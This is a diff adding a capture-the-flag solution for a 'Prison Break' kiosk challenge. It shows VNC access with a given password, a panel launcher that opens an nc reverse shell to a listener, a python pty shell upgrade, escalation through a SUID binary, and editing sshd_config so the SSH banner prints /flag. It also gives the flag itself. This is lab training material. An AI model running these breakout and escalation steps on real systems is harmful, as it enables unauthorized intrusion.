@@ -2258,20 +2258,31 @@ Here's your flag:
 <hr>
 
 ### Prison Break
-Description -
+Description - We need someone to pentest this prison kiosk before it goes live. We've disabled most functionality on the desktop, and planted a flag at /flag. Can you break out? Challenge IP: 192.168.88.100 The password is "prisoner" 
+Flag format: FLAG{Example_Flag_Goes_here}
+Note: To solve this challenge, VDI access is required.
 
 Solution:
 Connect to the kiosk using vncviewer 192.168.88.100:5901 and password 'prisoner'
 
-Create a new launcher shortcut on the panel that'll start nc - see image
+Create a new launcher shortcut on the panel that'll start nc
+![screenshot](/prison/Picture1.png)
+![screenshot](/prison/Picture2.png)
+![screenshot](/prison/Picture3.png)
+![screenshot](/prison/Picture4.png)
+![screenshot](/prison/Picture5.png)
+![screenshot](/prison/Picture6.png)
+![screenshot](/prison/Picture7.png)
 
 Start a listener on Kali VDI
+```
 nc -nlvp 4444
-
+```
 Click the launcher in the Kiosk and establish a reverse shell.
 For a fully interactive shell, enter:
+```
 python -c 'import pty;pty.spawn("/bin/bash")';
-
+```
 Checking for odd binaries reveals
 ```
 /usr/sbin/elevate
@@ -2289,13 +2300,40 @@ then run
 ```
 to set the UID to 1000 (admin)
 
-/etc/sshd/sshd_config is wriatable by admin
+Run the following to list all files writable by user admin
+```
+find / -user admin -perm /u=w 2>/dev/null
+```
+The main ones of interest are towards the bottom
+```
+/etc/ssh/sshd_config
+/home/admin
+/home/admin/.profile
+/home/admin/.bashrc
+/home/admin/.bash_history
+/home/admin/.bash_logout
+```
+The key one in this case is sshd_config
+Modify this in one line using
+```
+vi -c '%s/#Banner none/Banner \/flag/g' /etc/ssh/sshd_config -c 'wq!'
+```
+Once this is done, reboot
+```
+sudo reboot
+```
+and connect again via the vnc session then establish a shell again
+```
+python -c 'import pty;pty.spawn("/bin/bash")';
+```
+Then try ssh to localhost
+```
+ssh admin@localhost
+```
+![screenshot](/prison/final.png)
 
-Modify the sshd_config file
-In the config file there is a location to write to
-
-GOTTA FINISH THIS ONE
-
+:+1: FLAG{c0mputers_were_a_mistak3}
+<hr>
 
 ### Rbac User api
 Description - The pentest report for our user API prototype came back and it had red everywhere.
